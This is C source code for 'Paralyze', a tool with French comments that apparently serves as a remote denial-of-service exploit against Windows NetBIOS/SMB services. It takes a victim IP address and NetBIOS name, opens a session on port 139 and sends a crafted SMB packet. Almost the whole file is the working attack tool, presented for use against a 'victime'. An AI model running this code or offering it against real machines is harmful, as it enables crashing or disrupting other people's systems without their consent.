#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>

#ifndef AUTEUR
	#define AUTEUR "SLy"
#endif

#ifndef GROUPE
	#define GROUPE "rtc"
#endif

#ifndef EMAIL
	#define EMAIL "rtcSLy@yahoo.fr"
#endif

char para[]= "\x00\x00\x00\x00\x43\x53\x4d\x42\xd0\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x19\x00\x04\x67\x61\x6E\x67\x00\x04\x68\x61\x63\x6B\x65\x72\x00"
"\x01\x08\x00\x79\x65\x61\x68\x2E\x2E\x2E\x00\x00";

struct sreq /* Voici la structure d'une "NetBIOS session request" */
        {
        char entete[5];  
        char yoname[32];
        char sep[2];
        char myname[32];
        char fin[1];
        };

void NetBIOS_Name(char *name1, char *name2); 

int main(int argc, char *argv[]){
char buf[4000], myname[33], yoname[33];
struct sockaddr_in sin;
int sock, x;
struct sreq smbreq;

printf("Paralyze by SLy (member of RTC) : %s\n", EMAIL);

if (argc != 3) {
	printf("Usage: Paralyze <ip de victime> <NOM NetBIOS de la victime>\n");
	printf("--Le nom NetBIOS name doit etre en majuscule.\n\n");
	exit(1);
	}

NetBIOS_Name("RTC",myname); 
NetBIOS_Name(argv[2],yoname);

printf("Tentative sur %s avec le nom NetBIOS %s \n",argv[1],argv[2]);

sin.sin_addr.s_addr = inet_addr(argv[1]);
sin.sin_family      = AF_INET;
sin.sin_port        = htons(139);

sock = socket(AF_INET,SOCK_STREAM,0);
if((connect(sock,(struct sockaddr_in *)&sin,sizeof(sin))) < 0)
	{
	perror("Probleme lors de la connection.");
	exit(1);
	}

memset(buf,0,4000);

memcpy(smbreq.entete, "\x81\x00\x00\x00\x43", 5); 
strncpy(smbreq.yoname, yoname, 32);
memcpy(smbreq.sep, "\x00\x20", 2); 
strncpy(smbreq.myname, myname, 32);              
memcpy(smbreq.fin, "\x00", 1);                  


write(sock,&smbreq,72);  /*Envoie la demande de session*/
x=read(sock,buf,4000);

if(x<1)
	{ 
	printf("Probleme : aucune reponse\n");
	exit(1);
	}

switch(buf[0])
	{
	case '\x82': printf("Session acceptee");
			break;
	case '\x84': printf("Session redirigee :\nExit");
			exit(1);
			break; // pour faire conforme
	case '\x83': printf("Session refusee :\n");
			switch(buf[4])
				{
				case '\x80':printf("Pas d'ecoute sur le nom NetBIOS"
                                            " appelee. ");
						break;
				case '\x81':printf("Pas d'ecoute pour le nom NetBIOS"
 							" appelant.");
						break;
				case '\x82':printf("Nom NetBIOS appele non present.");
						break;
				case '\x83':printf("Nom NetBIOS appele present "
							"mais pas assez de ressources.");
						break;
				case '\x8F':printf("Erreur non specifiee.");
						break;
				default: printf("????????????????????");
				}
			exit(1);
			break;
	default : printf("Erreur indefini");
		   exit(1);
	}

write(sock,&para,72);  /*on envoie le message*/
x=read(sock,buf,4000);   /* on regarde ce qui nous renvoie au cas ou*/
close(sock);
printf("done\n");
}

/* Voici LA fonction qui transforme le nom NetBIOS de 15 lettres contenu dans
 name1 en 32 lettres selon le procede (voir plus haut) et qui va dans name2 */

void NetBIOS_Name(char *name1, char *name2)
{ char c, c1, c2;
  int i, len;
  len = strlen(name1);
  for (i = 0; i < 16; i++) 
  {
    if (i >= len) 
	{
	c1 = 'C'; c2 = 'A'; // CA est un espace 
	} 
	else 
	{
      c = name1[i];
      c1 = (char)((int)c/16 + (int)'A');
      c2 = (char)((int)c%16 + (int)'A');
	}
    name2[i*2] = c1;
    name2[i*2+1] = c2;
  }
  name2[30] = 'A';
  name2[31] = 'D';
  name2[32] = 0;   // pour la fin du nom
}

